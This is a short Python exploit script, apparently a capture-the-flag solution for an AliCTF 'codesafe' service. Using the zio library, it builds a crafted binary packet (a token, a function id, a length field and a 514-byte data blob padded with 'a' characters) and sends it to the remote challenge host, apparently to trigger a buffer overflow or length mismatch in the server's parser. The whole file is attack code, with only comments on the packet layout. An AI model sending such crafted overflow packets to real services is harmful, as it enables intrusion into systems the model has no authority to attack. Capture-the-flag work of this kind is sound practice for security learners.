#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '10.211.55.48'
ip = 'codesafe100.alictf.com'
port = 30000

# UINT_SIZE = 4
# buf[0] = len_token
# buf[1->len_token] = token
# buf[len_token+1] = function_id
# buf[len_token+2->len_token+2+UINT_SIZE-1] = host_len_data(len_data)
# buf[len_token+2+UINT_SIZE->len_token+2+UINT_SIZE+host_len_data-1] = data

token = '603a072175332a3fbb37f5b43f6bcde6'
len_token = len(token)
function_id = 1
len_data = 514
data = '\xc8\x00' + 'a'*512

buf = ""
buf += chr(len_token)
buf += token
buf += chr(function_id)
buf += b32(len_data)
buf += data

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
io.write(buf)
io.read()
